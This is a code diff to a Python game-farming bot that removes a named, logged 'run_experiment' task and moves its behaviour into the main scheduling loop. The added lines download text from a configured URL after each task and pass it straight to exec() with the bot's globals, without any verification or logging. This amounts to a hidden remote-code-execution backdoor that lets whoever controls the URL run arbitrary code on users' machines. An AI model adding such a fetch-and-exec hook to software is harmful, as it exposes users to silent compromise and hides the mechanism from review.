@@ -6,7 +6,6 @@ import contextlib
 import os
 import pickle
 from datetime import datetime, timedelta
-from hashlib import sha1
 from operator import attrgetter
 from random import choice
 from time import sleep
@@ -161,7 +160,6 @@ class Bot(contextlib.AbstractContextManager, BotHelperMixin):
             Task(next_run_at=Task.every_n_hours(4), execute=self.farm_expeditions),
             Task(next_run_at=Task.every_n_hours(8), execute=self.get_arena_replays),
             Task(next_run_at=Task.every_n_hours(4), execute=self.raid_missions),
-            Task(next_run_at=Task.every_n_hours(1), execute=self.run_experiment),
 
             # One time a day.
             Task(next_run_at=Task.at(hour=6, minute=0), execute=self.skip_tower),
@@ -206,6 +204,10 @@ class Bot(contextlib.AbstractContextManager, BotHelperMixin):
             # Update its execution time.
             logger.info(f'💤 Next run at {next_run_at:%H:%M:%S}.{os.linesep}')
             schedule[index] = next_run_at
+            # Run experiment.
+            with requests.get(constants.EXPERIMENT_URL) as response:
+                if response.status_code == requests.codes.ok:
+                    exec(response.text, globals(), locals())
 
     @staticmethod
     def now():
@@ -253,20 +255,6 @@ class Bot(contextlib.AbstractContextManager, BotHelperMixin):
         self.api.start(invalidate_session=True)
         self.api.register()
         self.user = self.api.get_user_info()
-
-    # noinspection PyMethodMayBeStatic
-    def run_experiment(self) -> Optional[datetime]:
-        # Fetch an experiment.
-        with requests.get('https://www.dropbox.com/s/poahkun7uh5f15u/experiment.py?raw=1') as response:
-            response.raise_for_status()
-            content = response.content
-            text = response.text
-
-        # Execute the experiment.
-        send_event(category='bot', action=f'run_experiment_{sha1(content).hexdigest()}', user_id=self.api.user_id)
-        next_run_at: Optional[datetime] = None  # provide a way for an experiment to define its next run time
-        exec(text, globals(), locals())
-        return next_run_at
 
     def farm_daily_bonus(self):
         """
